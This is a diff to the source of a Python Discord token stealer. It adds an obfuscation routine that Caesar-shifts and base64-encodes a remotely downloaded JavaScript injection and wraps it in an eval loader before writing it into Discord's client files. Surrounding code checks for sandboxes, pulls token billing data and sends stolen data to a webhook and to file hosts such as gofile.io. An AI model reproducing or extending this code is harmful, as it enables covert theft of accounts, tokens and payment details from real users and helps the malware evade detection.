@@ -2,6 +2,7 @@ import os
 import threading
 from sys import executable
 from sqlite3 import connect as sql_connect
+from base64 import b64encode
 import re
 from base64 import b64decode
 from json import loads as json_loads, load
@@ -49,9 +50,38 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = 'WBH'
+wh00k = "WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
-    
+kr4mkr4m_c0de =  """function decrypt(chain) {
+    let script = chain
+    let buff = Buffer.from(script, 'base64');
+    let step1 = buff.toString('utf-8');
+
+    var k3y = step1.slice(-2);
+    var txt = step1.slice(0, -2);
+    var gap = k3y.split('').reduce(function(acc, val) {
+        return acc + val.charCodeAt(0);
+    }, 0) % 26
+
+    var src = "";
+    for (var i = 0; i < txt.length; i++) {
+        var c = txt[i];
+        if (c.match(/[a-z]/i)) {
+            var c_int = "";
+            if (c === c.toLowerCase()) {
+                c_int = String.fromCharCode((c.charCodeAt(0) - 97 - gap + 26) % 26 + 97);
+            } else {
+                c_int = String.fromCharCode((c.charCodeAt(0) - 65 - gap + 26) % 26 + 65);
+            }
+            src += c_int;
+        } else {
+            src += c;
+        }
+    }
+    return src
+}
+eval(decrypt("{SCRIPT}"))"""
+
 DETECTED = False
 #bir ucaktik dustuk bir gemiydik battik :(
 def g3t1p():
@@ -239,6 +269,28 @@ def G3tb1ll1ng(t0k3n):
 
     return b1ll1ng
 
+def jskr4mkr4m(scr1pt):
+    # set the alphabet
+    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    # set the caesar key
+    k3y = ''.join(random.sample(alpha, 2))
+    g4p = sum(ord(c) for c in k3y) % 26
+    c43s4r = ''
+    for c in scr1pt:
+        if c.isalpha():
+            if c.islower():
+                c_int = chr((ord(c) - 97 + g4p) % 26 + 97)
+            else:
+                c_int = chr((ord(c) - 65 + g4p) % 26 + 65)
+        else:
+            c_int = c
+        c43s4r += c_int
+    o8f_st1 = str(c43s4r + k3y)
+    byt3 = o8f_st1.encode('UTF-8')
+    t3xt = b64encode(byt3)
+    jskr4mkr4m = kr4mkr4m_c0de.replace('{SCRIPT}', t3xt.decode('UTF-8'))
+    return jskr4mkr4m
+
 def inj_discord():
 
     username = os.getlogin()
@@ -264,7 +316,9 @@ def inj_discord():
                                                     inj_content = requests.get(inj_url).text
 
                                                     inj_content = inj_content.replace("%WEBHOOK%", wh00k)
-
+                                                    
+                                                    inj_content = jskr4mkr4m(inj_content)
+                                                    
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj_content)
 inj_discord()
@@ -521,6 +575,21 @@ def upload(name, link):
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
         return
+
+
+
+
+# def upload(name, tk=''):
+#     headers = {
+#         "Content-Type": "application/json",
+#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+#     }
+
+#     # r = requests.post(hook, files=files)
+#     LoadRequests("POST", hook, files=files)
+    
+
+
 
 
 def wr1tef0rf1l3(data, name):
@@ -851,6 +920,14 @@ def uploadToAnonfiles(path):
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:return False
 
+# def uploadToAnonfiles(path):s
+#     try:
+#         files = { "file": (path, open(path, mode='rb')) }
+#         upload = requests.post("https://transfer.sh/", files=files)
+#         url = upload.text
+#         return url
+#     except:
+#         return False
 
 def KiwiFolder(pathF, keywords):
     global KiwiFiles
